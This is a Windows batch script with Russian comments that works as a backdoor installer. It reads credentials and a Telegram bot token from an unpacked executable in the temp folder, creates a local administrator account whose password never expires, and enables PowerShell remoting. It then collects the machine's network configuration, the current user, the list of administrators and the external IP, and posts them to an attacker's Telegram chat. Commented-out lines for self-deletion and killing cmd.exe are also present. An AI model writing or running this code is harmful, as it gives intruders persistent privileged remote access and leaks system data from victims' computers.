@echo off

setlocal enabledelayedexpansion
chcp 65001

:: if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 
:: Запуск Python скрипта и захват строк
for /f "tokens=1* delims=" %%i in ('%TEMP%\var_dist_unzipped\var.dist\var.exe') do (
    if not defined var1 (
        set var1=%%i
    ) else if not defined var2 (
        set var2=%%i
    ) else if not defined var3 (
        set var3=%%i
	) else if not defined var4 (
        set var4=%%i
    )
)

net user /add %var1% %var2%
net localgroup Администраторы %var1% /add
net localgroup Пользователи %var1% /del
wmic useraccount where "name='!var1!'" set passwordexpires=false

:: Получаем IP компьютера
for /f "skip=4 delims=" %%A in ('ipconfig /all') do (
    set "ip=!ip!%%A, "
)

:: Получаем пользователя, от имени которого выполнили скрипт.
for /f "delims=" %%A in ('whoami') do (
    set "user=!user!%%A, "
)

:: Получаем пользователей в группе "Администраторы"
for /f "skip=4 delims=" %%A in ('net localgroup "Администраторы"') do (
    set "adminUsers=!adminUsers!%%A, "
)


:: Выполнение команды PowerShell Enable-PSRemoting
powershell -Command "Enable-PSRemoting -Force"

:: Проверка успешности выполнения
if %errorlevel% equ 0 (
    set "WinRM=PSRemoting успешно включен."
) else (
    set "WinRM=Ошибка при включении PSRemoting."
)

:: Получаем внешний IP с помощью curl и записываем в переменную
for /f "tokens=*" %%a in ('curl -s http://ifconfig.me') do set "externalIP=%%a"

set "extip=    Внешний IP: !externalIP!"

set msg=!ip!!user!!adminUsers!!WinRM!!extip!
call :myFunction
endlocal

:: del "%~f0"
:: Завершаем все процессы cmd.exe
:: taskkill /F /IM cmd.exe
exit /b


:myFunction
curl -X POST "https://api.telegram.org/bot!var3!/sendMessage" -d "chat_id=!var4!&text=!msg!"
